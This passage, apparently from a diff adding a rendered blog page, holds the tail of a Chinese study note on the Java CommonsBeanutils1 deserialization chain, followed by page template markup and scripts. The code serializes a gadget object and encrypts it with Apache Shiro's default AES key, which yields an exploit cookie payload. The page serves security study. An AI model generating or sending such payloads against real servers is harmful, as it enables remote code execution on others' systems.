<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        <span class="hljs-comment">// 3. 工人开始干活：把对象冻结（序列化）并写入容器</span><br>        oos.writeObject(queue);<br>        <span class="hljs-comment">// 4. 关闭流（好习惯）</span><br>        oos.close();<br><br>        System.out.println(<span class="hljs-string">&quot;Payload 生成成功，长度: &quot;</span> + barr.size() + <span class="hljs-string">&quot; 字节&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Base64 编码后的序列化数据：&quot;</span>);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(barr.toByteArray(), key);<br>        System.out.printf(ciphertext.toString());<br>        <span class="hljs-comment">// 2. 反序列化 (模拟服务端接收并解析)</span><br>        <span class="hljs-comment">// 这一行代码执行时，计算器就会弹出！</span><br>        <span class="hljs-comment">//ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray());</span><br>        <span class="hljs-comment">//ObjectInputStream ois = new ObjectInputStream(bais);</span><br>        <span class="hljs-comment">//Object o = (Object)ois.readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/note/" class="category-chain-item">note</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/javasec/" class="category-chain-item">javasec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/javasec/">#javasec</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java安全漫谈学习笔记9-CB1链</div>
+      <div>https://rightevil.github.io/Java安全漫谈学习笔记9-CB1链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rightevil</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年5月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08-CC2%E9%93%BE/" title="Java安全漫谈学习笔记8-CC2链">
+                        <span class="hidden-mobile">Java安全漫谈学习笔记8-CC2链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="lv-container" data-id="city" data-uid="MTAyMC81NzQyNC8zMzg4OA==">
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#lv-container', function() {
+        Fluid.utils.createScript('https://cdn-city.livere.com/js/embed.dist.js');
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
